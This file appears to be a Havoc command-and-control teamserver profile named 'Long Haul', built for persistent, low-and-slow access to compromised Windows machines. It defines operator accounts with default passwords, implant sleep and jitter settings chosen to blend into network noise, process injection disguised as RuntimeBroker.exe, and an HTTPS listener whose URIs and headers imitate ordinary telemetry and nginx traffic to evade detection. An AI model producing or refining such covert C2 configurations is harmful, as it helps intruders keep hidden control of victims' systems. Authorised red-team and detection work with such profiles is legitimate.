# Long Haul Profile
# Low-and-slow configuration for persistent long-term access.
# High sleep intervals with jitter to blend into normal network noise.

Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm       = "/usr/bin/nasm"
    }
}

Operators {
    user "operator" {
        Password = "password1234"
    }

    user "Neo" {
        Password = "password1234"
    }

    user "<YOUR_USERNAME>" {
        Password = "<YOUR_PASSWORD>"
    }
}

Demon {
    Sleep  = 60      # 60 second base callback interval
    Jitter = 40      # 40% jitter (36-84 second range)

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\RuntimeBroker.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\RuntimeBroker.exe"
    }
}

Listeners {
    Http {
        Name         = "Long Haul HTTPS"
        Hosts        = ["<YOUR_C2_DOMAIN>"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = 443
        PortConn     = 443
        Secure       = true
        KillDate     = "2026-06-01 00:00:00"
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

        Uris = [
            "/api/v2/telemetry",
            "/cdn/assets/check",
            "/services/health",
        ]

        Headers = [
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate, br",
        ]

        Response {
            Headers = [
                "Content-Type: application/json; charset=utf-8",
                "Server: nginx/1.24.0",
                "X-Content-Type-Options: nosniff",
                "Cache-Control: no-cache, no-store, must-revalidate",
                "Connection: keep-alive",
            ]
        }
    }
}
